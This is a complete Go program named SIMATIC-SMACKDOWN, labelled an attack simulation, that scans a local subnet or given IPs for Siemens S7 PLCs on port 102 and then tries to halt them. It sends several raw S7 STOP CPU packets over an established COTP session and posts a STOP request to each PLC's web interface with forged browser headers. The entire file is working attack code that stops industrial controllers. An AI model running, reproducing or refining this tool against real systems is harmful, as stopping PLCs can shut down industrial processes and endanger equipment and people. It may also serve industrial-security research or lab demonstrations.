package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"os"
	//"runtime"
	"strings"
	"time"
)

// GetIPAddr returns the first non-loopback IPv4 address.
func GetIPAddr() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		fmt.Printf("[ERROR] Failed to get network interfaces: %v\n", err)
		return ""
	}

	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
			fmt.Printf("[+] Found local IP address: %s\n", ipnet.IP.String())
			return ipnet.IP.String()
		}
	}
	return ""
}

// GetNetwork generates a list of all IPs in the network range of the given IP address.
func GetNetwork(ipAddr string) []string {
	_, ipnet, err := net.ParseCIDR(ipAddr)
	if err != nil {
		fmt.Printf("[ERROR] Failed to parse CIDR: %v\n", err)
		return nil
	}

	mask := binary.BigEndian.Uint32(ipnet.Mask)
	start := binary.BigEndian.Uint32(ipnet.IP) + 1
	finish := (start & mask) | (mask ^ 0xffffffff)

	var ipList []string
	for i := start; i <= finish; i++ {
		ip := make(net.IP, 4)
		binary.BigEndian.PutUint32(ip, i)
		ipList = append(ipList, ip.String())
	}
	fmt.Printf("[+] Generated %d IP addresses in subnet %s\n", len(ipList), ipAddr)
	return ipList
}

// ScanIP returns a list of reachable IPs on port 102.
func ScanIP(ipList []string) []string {
	fmt.Printf("[*] Starting scan for S7 PLCs on port 102...\n")
	var scannedIPs []string
	for _, ip := range ipList {
		target := ip + ":102"
		if conn, err := net.DialTimeout("tcp", target, 1*time.Second); err == nil {
			fmt.Printf("[+] Found S7 PLC at: %s\n", ip)
			scannedIPs = append(scannedIPs, ip)
			_ = conn.Close()
		}
	}
	fmt.Printf("[+] Scan complete. Found %d S7 PLCs\n", len(scannedIPs))
	return scannedIPs
}

// VerifyTargets checks if provided IPs have port 102 open
func VerifyTargets(targets []string) []string {
	fmt.Printf("[*] Verifying target IPs for S7 PLCs on port 102...\n")
	var validTargets []string
	for _, ip := range targets {
		target := ip + ":102"
		if conn, err := net.DialTimeout("tcp", target, 1*time.Second); err == nil {
			fmt.Printf("[+] Confirmed S7 PLC at: %s\n", ip)
			validTargets = append(validTargets, ip)
			_ = conn.Close()
		} else {
			fmt.Printf("[-] Target %s is not reachable on port 102\n", ip)
		}
	}
	return validTargets
}

// EstablishS7Connection sets up proper COTP/S7 connection
func EstablishS7Connection(ip string) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", ip+":102", 2*time.Second)
	if err != nil {
		return nil, err
	}

	// COTP Connection Request
	cotpConnect := []byte{
		0x03, 0x00, 0x00, 0x16, 0x11, 0xe0, 0x00, 0x00,
		0x00, 0x01, 0x00, 0xc0, 0x01, 0x0a, 0xc1, 0x02,
		0x01, 0x00, 0xc2, 0x02, 0x01, 0x00,
	}

	_, err = conn.Write(cotpConnect)
	if err != nil {
		conn.Close()
		return nil, err
	}

	// Read COTP response
	buffer := make([]byte, 256)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, err := conn.Read(buffer)

	if err == nil && n > 5 && buffer[5] == 0xD0 {
		// COTP connected, now setup S7
		s7Setup := []byte{
			0x03, 0x00, 0x00, 0x19, 0x02, 0xf0, 0x80, 0x32,
			0x01, 0x00, 0x00, 0x04, 0x00, 0x00, 0x08, 0x00,
			0x00, 0xf0, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0xe0,
		}

		_, err = conn.Write(s7Setup)
		if err == nil {
			conn.Read(buffer) // Read S7 response
		}
	}

	return conn, nil
}

// EnhancedKillIP sends STOP commands with S7-1200 support
func EnhancedKillIP(scannedIPs []string) {
	fmt.Printf("\n[*] Initiating enhanced S7 protocol STOP CPU attack...\n")

	// Multiple STOP command variants for different PLC models
	stopCommands := []struct {
		name    string
		command []byte
	}{
		{
			"S7-1200 STOP (Function 0x28)",
			[]byte{0x03, 0x00, 0x00, 0x25, 0x02, 0xf0, 0x80, 0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x50, 0x5f, 0x50, 0x52, 0x4f, 0x47, 0x52, 0x41, 0x4d},
		},
		{
			"Standard STOP (Function 0x29)",
			[]byte{0x03, 0x00, 0x00, 0x21, 0x02, 0xf0, 0x80, 0x32, 0x01, 0x00, 0x00, 0x06, 0x00, 0x00, 0x10, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x50, 0x5f, 0x50, 0x52, 0x4f, 0x47, 0x52, 0x41, 0x4d},
		},
		{
			"Minimal STOP",
			[]byte{0x03, 0x00, 0x00, 0x19, 0x02, 0xf0, 0x80, 0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00},
		},
	}

	for _, ip := range scannedIPs {
		fmt.Printf("\n[*] Attacking PLC at %s\n", ip)

		// First try with proper connection setup
		conn, err := EstablishS7Connection(ip)
		if err != nil {
			fmt.Printf("[-] Failed to establish S7 connection: %v\n", err)
			// Try raw connection
			conn, err = net.Dial("tcp", ip+":102")
			if err != nil {
				fmt.Printf("[-] Failed to connect to %s\n", ip)
				continue
			}
		}

		// Try each STOP command
		for _, cmd := range stopCommands {
			fmt.Printf("[!] Sending %s\n", cmd.name)
			_, err := conn.Write(cmd.command)
			if err != nil {
				fmt.Printf("[-] Failed to send: %v\n", err)
			}
			time.Sleep(200 * time.Millisecond)
		}

		conn.Close()
	}
	fmt.Printf("[*] S7 protocol attack phase complete\n")
}

// KillHTTP sends a stop command via HTTP to the devices at the scanned IPs.
func KillHTTP(scannedIPs []string) {
	fmt.Printf("\n[*] Initiating HTTP web interface STOP attack...\n")
	client := &http.Client{Timeout: 5 * time.Second}

	for _, ip := range scannedIPs {
		// Try both HTTP and HTTPS
		urls := []string{
			"http://" + ip + "/CPUCommands",
		}

		for _, url := range urls {
			data := strings.NewReader(`Stop=1&PriNav=Start`)
			req, err := http.NewRequest("POST", url, data)
			if err != nil {
				continue
			}

			fmt.Printf("[!] Sending STOP command to PLC at %s via %s\n", ip, url[:5])
			setHTTPHeaders(req, ip)

			if resp, err := client.Do(req); err != nil {
				fmt.Printf("[-] HTTP request failed for %s: %v\n", url, err)
			} else {
				fmt.Printf("[+] HTTP request sent successfully to %s (Status: %s)\n", ip, resp.Status)
				_ = resp.Body.Close()
			}
		}
	}
	fmt.Printf("[*] HTTP attack phase complete\n")
}

// setHTTPHeaders sets the necessary HTTP headers for the requests in KillHTTP.
func setHTTPHeaders(req *http.Request, ip string) {
	req.Header.Set("Host", ip)
	req.Header.Set("Content-Length", "19")
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Origin", "http://"+ip)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Set("Referer", "http://"+ip+"/Portal/Portal.mwsl?PriNav=Start")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Connection", "close")
	req.Header.Set("Cookie", "siemens_automation_no_intro=TRUE")
}

// ValidateIP checks if a string is a valid IP address
func ValidateIP(ip string) bool {
	return net.ParseIP(ip) != nil
}

func main() {
	fmt.Println("=== SIMATIC-SMACKDOWN - S7 PLC Attack Simulation ===")
	fmt.Println("[*] Enhanced version with S7-1200 support")

	var targets []string

	// Check if IP addresses were provided as arguments
	if len(os.Args) > 1 {
		fmt.Printf("[*] Target mode: Specific IPs provided\n")
		// Validate provided IPs
		for _, arg := range os.Args[1:] {
			if ValidateIP(arg) {
				targets = append(targets, arg)
				fmt.Printf("[+] Added target: %s\n", arg)
			} else {
				fmt.Printf("[-] Invalid IP address: %s (skipping)\n", arg)
			}
		}

		if len(targets) == 0 {
			fmt.Println("[ERROR] No valid IP addresses provided. Exiting.")
			fmt.Println("Usage: simatic_smackdown [ip1] [ip2] ...")
			return
		}

		// Verify targets have port 102 open
		targets = VerifyTargets(targets)
		if len(targets) == 0 {
			fmt.Println("[!] No targets are reachable on port 102. Exiting.")
			return
		}
	} else {
		// No arguments - perform network scan
		fmt.Printf("[*] Target mode: Network scan\n")
		fmt.Println("[*] No specific targets provided - scanning local network...")

		ipAddr := GetIPAddr() + "/24"
		if ipAddr == "/24" {
			fmt.Println("[ERROR] No network interface found. Exiting.")
			return
		}

		fmt.Printf("[*] Targeting subnet: %s\n", ipAddr)
		ipList := GetNetwork(ipAddr)
		if ipList == nil {
			fmt.Println("[ERROR] Failed to generate IP list. Exiting.")
			return
		}

		targets = ScanIP(ipList)
		if len(targets) == 0 {
			fmt.Println("[!] No S7 PLCs found on the network. Exiting.")
			return
		}
	}

	// Attack the targets with enhanced S7-1200 support
	fmt.Printf("\n[*] Proceeding with attack on %d target(s)\n", len(targets))
	EnhancedKillIP(targets)
	KillHTTP(targets)

	fmt.Println("\n[*] Attack simulation complete.")
	fmt.Printf("[*] Targeted %d PLCs in total\n", len(targets))
	fmt.Println("\n[!] Check PLC status:")
	fmt.Println("    - RUN/STOP LED on the PLC")
	fmt.Println("    - TIA Portal connection status")
	fmt.Println("    - Web interface (if available)")
}
